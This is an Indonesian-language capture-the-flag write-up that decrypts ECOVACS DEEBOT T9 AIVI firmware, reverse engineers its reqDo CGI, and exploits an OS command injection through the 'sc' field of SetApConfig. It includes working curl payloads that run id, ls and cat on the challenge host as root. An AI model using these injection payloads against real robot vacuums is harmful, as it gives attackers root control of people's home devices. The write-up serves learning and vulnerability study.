# Clean Sweep — Boot2RootIoT

**Challenge:** Clean Sweep
**Category:** Boot2RootIoT
**Target:** `https://clean-sweep-24c5d36f2fcb.chall.nnsc.tf`
**Goal:** Mendapatkan akses **root** dan membaca `/root/flag.txt`.

## 1. Reconnaissance

Challenge memberikan sebuah service HTTP yang tampak seperti web interface firmware robot vacuum **ECOVACS DEEBOT T9 AIVI**, firmware **1.4.9** dari tahun 2021.

Request awal:

```bash
curl -sk https://clean-sweep-24c5d36f2fcb.chall.nnsc.tf/
```

Beberapa endpoint yang ditemukan seperti:

```text
/api
/firmware
/debug
/download
/startFct
/reqDo
/index.cgi
/cgi-bin
```

Sebagian besar endpoint mengembalikan `200` tetapi body kosong, sedangkan `/cgi-bin/` memberikan `404`.

Pada tahap ini, daripada melakukan brute-force endpoint secara terus-menerus, fokus dialihkan ke firmware karena challenge secara eksplisit mengatakan:

> "We extracted the web CGI from that firmware and are hosting it here for you."

Ini adalah indikasi kuat bahwa vulnerability dapat dianalisis dari firmware lokal.

---

# 2. Mendapatkan Firmware Asli

Untuk memperoleh firmware T9 AIVI, digunakan `ecovacs-firmware-tools`.

Repository:

```bash
git clone https://github.com/denysvitali/ecovacs-firmware-tools.git \
    ~/tools/ecovacs-firmware-tools
```

Build:

```bash
cd ~/tools/ecovacs-firmware-tools
go build -o ecovacs-firmware-tools .
```

Tool kemudian digunakan untuk mencari firmware berdasarkan model:

```bash
~/tools/ecovacs-firmware-tools/ecovacs-firmware-tools \
    download --models 659yh8
```

Tool mengidentifikasi:

```text
DEEBOT T9 AIVI (659yh8)
fw0 v1.4.9
59,611,104 bytes
```

Firmware kemudian didownload:

```bash
~/tools/ecovacs-firmware-tools/ecovacs-firmware-tools \
    download --models 659yh8 --download -o ~/ecovacs_fw
```

File yang didapat:

```text
~/ecovacs_fw/659yh8_fw0_v1.4.9_1de7de90.bin
```

---

# 3. Analisis Struktur Firmware

Firmware tidak dikenali oleh `binwalk` secara langsung karena masih dalam format encrypted/container.

Tool Ecovacs kemudian digunakan untuk melihat section:

```bash
~/tools/ecovacs-firmware-tools/ecovacs-firmware-tools \
    decrypt --list-sections \
    659yh8_fw0_v1.4.9_1de7de90.bin
```

Hasilnya:

```text
Manifest: T9AF_px30 v1.4.9

Section 0: manifest
Section 1: pre_upgrade_script
Section 2: normal_boot
Section 3: normal_fs
Section 4: mcu
Section 5: post_upgrade_script
```

Section terpenting adalah:

```text
normal_fs
```

Kemudian seluruh firmware didecrypt:

```bash
~/tools/ecovacs-firmware-tools/ecovacs-firmware-tools \
    decrypt \
    -d 659yh8 \
    -p px30 \
    --param fw0 \
    --version 1 \
    -o decrypted \
    659yh8_fw0_v1.4.9_1de7de90.bin
```

Output:

```text
decrypted/normal_fs.img
```

File tersebut teridentifikasi sebagai:

```text
Squashfs filesystem, little endian, version 4.0
```

---

# 4. Extract Root Filesystem

Filesystem kemudian diekstrak:

```bash
mkdir -p rootfs
unsquashfs -d rootfs decrypted/normal_fs.img
```

Pada extract pertama terdapat error karena direktori `rootfs/bin` sudah ada. Namun filesystem tetap berhasil diekstrak dan struktur rootfs dapat dianalisis.

Pencarian CGI menemukan:

```text
rootfs/etc/www/reqDo
```

Pemeriksaan binary:

```bash
file rootfs/etc/www/reqDo
```

Hasil:

```text
ELF 64-bit LSB executable
ARM aarch64
dynamically linked
with debug_info
not stripped
```

Ini sangat menguntungkan karena binary masih memiliki simbol dan debug information.

---

# 5. Reverse Engineering `reqDo`

Pencarian symbol:

```bash
nm -C rootfs/etc/www/reqDo
```

Menghasilkan fungsi penting:

```text
cmd_system
SetFct
GetCredential
GetDevInfo
parseJsonCmd
getPostData
main
```

Hal paling menarik adalah fungsi:

```text
cmd_system()
```

Reverse engineering dengan radare2 menunjukkan bahwa fungsi tersebut menggunakan:

```text
popen()
```

Secara konseptual:

```c
popen(command, "r");
```

Artinya, apabila attacker dapat mengontrol `command`, maka input tersebut akan dieksekusi oleh shell.

---

# 6. Menemukan Dispatcher JSON

`main()` memperlihatkan bahwa CGI:

1. Mengharapkan `POST`
2. Mengharapkan `Content-Type: application/json`
3. Membaca POST body
4. Memanggil `parseJsonCmd()`

Potongan alurnya secara konseptual:

```text
HTTP POST
   |
   v
getPostData()
   |
   v
parseJsonCmd()
   |
   +--> GetWCInfo
   +--> SetApConfig
   +--> SetFct
   +--> GetCredential
   +--> GetDevInfo
   +--> GetNetworkLog
```

Dari reverse engineering `parseJsonCmd()`, key dispatcher ditemukan sebagai:

```text
td
```

Contohnya:

```json
{
  "td": "SetApConfig"
}
```

---

# 7. Analisis `SetApConfig`

Reverse engineering `SetApConfig()` menunjukkan beberapa field JSON diambil:

```text
SSID
PASSPHRASE
sc
sck2
lb
```

Kemudian dibuat command string:

```text
td="SetApConfig" SSID="%s" PASSPHRASE="%s" sc="%s" sck2="%s" lb="%s" %s
```

Command ini kemudian dikirim ke:

```text
cmd_system()
```

dan akhirnya:

```text
popen()
```

Pada titik ini muncul indikasi **OS Command Injection**.

---

# 8. Menelusuri Hook Script

Firmware juga menyediakan script:

```text
/etc/wifi/bumbee_hook.sh
```

Bagian `CmdSetApConfig()` sangat penting.

Script melakukan:

```sh
SSID2=`echo $SSID | base64 -d | cjson`
```

dan:

```sh
PWD2=`echo $PASSPHRASE | base64 -d | cjson`
```

Namun field lain digunakan secara langsung:

```sh
[ "${sc}_" != "_" ] && bumbeeStr="$bumbeeStr,\"sc\":\"${sc}\""
[ "${sck2}_" != "_" ] && bumbeeStr="$bumbeeStr,\"sck2\":\"${sck2}\""
[ "${lb}_" != "_" ] && bumbeeStr="$bumbeeStr,\"lb\":\"${lb}\""
```

Script lalu menjalankan:

```sh
mdsctl bumbee "${bumbeeStr}" ...
```

Hal yang paling penting adalah **nilai `sc` tidak di-escape sebelum dimasukkan ke command string yang sebelumnya sudah berada di jalur `popen()`**.

Jadi kita memiliki chain:

```text
HTTP JSON
   |
   v
td = SetApConfig
   |
   v
sc
   |
   v
snprintf()
   |
   v
cmd_system()
   |
   v
popen()
   |
   v
Shell command injection
```

---

# 9. Validasi Command Injection

Sebelum membaca flag, exploit divalidasi menggunakan command benign:

```bash
curl -sk -X POST \
  'https://clean-sweep-24c5d36f2fcb.chall.nnsc.tf/reqDo' \
  -H 'Content-Type: application/json' \
  --data '{"td":"SetApConfig","sc":"x\";id;#","sck2":"x","lb":"x"}'
```

Response:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Ini membuktikan bahwa command injection berjalan dan command dieksekusi sebagai:

```text
root
```

Dengan kata lain, target sudah langsung mencapai **RCE sebagai root**.

---

# 10. Membuktikan Akses Root

Selanjutnya command enumeration sederhana:

```bash
curl -sk -X POST \
  'https://clean-sweep-24c5d36f2fcb.chall.nnsc.tf/reqDo' \
  -H 'Content-Type: application/json' \
  --data '{"td":"SetApConfig","sc":"x\";ls /root/;#","sck2":"x","lb":"x"}'
```

Response:

```text
flag.txt
```

Artinya file target memang tersedia di:

```text
/root/flag.txt
```

---

# 11. Mendapatkan Flag

Final payload:

```bash
curl -sk -X POST \
  'https://clean-sweep-24c5d36f2fcb.chall.nnsc.tf/reqDo' \
  -H 'Content-Type: application/json' \
  --data '{"td":"SetApConfig","sc":"x\";cat /root/flag.txt;#","sck2":"x","lb":"x"}'
```

Response:

```text
NNS{7his_15_0ld_f1rMw4Re_50_0fC_tHi5_1s_e4sy_f0r_Y0U}
```

# Flag

```text
NNS{7his_15_0ld_f1rMw4Re_50_0fC_tHi5_1s_e4sy_f0r_Y0U}
```

---

# 12. Vulnerability Summary

Root cause challenge ini adalah **OS Command Injection** pada CGI `reqDo`.

Vulnerable flow:

```text
POST /reqDo
Content-Type: application/json
        |
        v
{"td":"SetApConfig", ...}
        |
        v
parseJsonCmd()
        |
        v
SetApConfig()
        |
        v
snprintf(command, ...)
        |
        v
cmd_system()
        |
        v
popen(command, "r")
        |
        v
Command Injection
        |
        v
uid=0(root)
```
